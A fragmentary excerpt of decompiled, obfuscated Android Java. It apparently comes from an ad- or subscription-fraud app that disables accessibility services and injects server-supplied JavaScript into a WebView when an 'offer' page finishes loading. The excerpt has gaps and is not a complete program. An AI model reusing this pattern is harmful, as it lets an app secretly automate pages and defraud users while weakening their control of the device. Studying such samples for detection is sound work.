...
public class Va implements View.OnClickListener {
    ...
    //    private ImageView stopView, backView, homeView, goView;
...
//        windParams.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_FULLSCREEN;
    ...
    public void startLoad(Ma offer) {
        ...
        XmlShareUtils.disableAccessibility(mContext);
    ...
    private class MwebViewClient extends WebViewClient {
        ...
        public void onPageFinished(WebView view, String url) {
            ...
            if (!TextUtils.isEmpty(jsdata) && mWebView != null) {
                mWebView.loadUrl(new String(HttpUtils.JAVA_BYTE_JS) + jsdata, HttpUtils.getWebHead());
                mWebView.loadUrl(new String(HttpUtils.JAVA_BYTE_JS_LP) + offer_id + ")", HttpUtils.getWebHead());
...
//            backView.setBackgroundResource(R.drawable.x_browser_back_press);
            ...
            view.clearView();
            String data = " ";
            view.loadUrl("javascript:document.body.innerHTML=\"" + data + "\"", HttpUtils.getWebHead());
            fail_url = failingUrl;
